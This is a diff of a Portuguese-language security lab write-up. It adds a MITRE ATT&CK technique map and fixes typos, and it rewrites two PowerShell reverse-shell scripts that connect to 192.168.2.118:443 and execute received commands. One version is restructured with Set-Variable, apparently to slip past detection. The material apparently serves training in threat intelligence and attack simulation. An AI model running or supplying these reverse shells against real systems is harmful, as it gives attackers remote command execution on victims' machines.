@@ -198,6 +198,30 @@ URL: http://secure-data.net/api/upload?session=IyMjIyMjIyMjI
 Payload Size: 16.0KB  
 Verdict: Unusual outbound data transfer
 ```
+Mapeamento TTPs com MITRE ATT&CK
+```
+[Initial Access]
+   ↓
+T1566.001 – Phishing (Spearphishing Attachment)
+
+[Execution]
+   ↓
+T1204.002 – User Execution (Malicious File)
+T1059.001 – PowerShell
+
+[Persistence]
+   ↓
+T1053.005 – Scheduled Task
+
+[Lateral Movement]
+   ↓
+T1021.002 – SMB/Windows Admin Shares
+
+[Exfiltration]
+   ↓
+T1041 – Exfiltration Over C2 Channel
+
+```
 
 Preparação do ambiente:
 - Baixar Scripts ps1 no Kali Linux
@@ -268,7 +292,7 @@ cat base64.txt | base64 -d
 ### Desafio 3: Criação de Feed de Threat Intelligence
 SpiderFoot GitHub - https://github.com/smicallef/spiderfoot
 
-- Download da aplicaçaõ
+- Download da aplicação
 ```
 wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz
 ```
@@ -336,7 +360,7 @@ Payload Shell Reverso - https://swisskyrepo.github.io/InternalAllTheThings/cheat
 
 - Script Reverse Shell - pos.ps1
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.2.118',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+$client = New-Object System.Net.Sockets.TCPClient('192.168.2.118',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 - Setando o path do script pos.ps1
 ```
@@ -354,9 +378,9 @@ ALL
 ```
 1
 ```
--  Script Reverse Shell - pos1.ps1
+- Script Reverse Shell - pos1.ps1
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.2.118',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.2.118',443));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
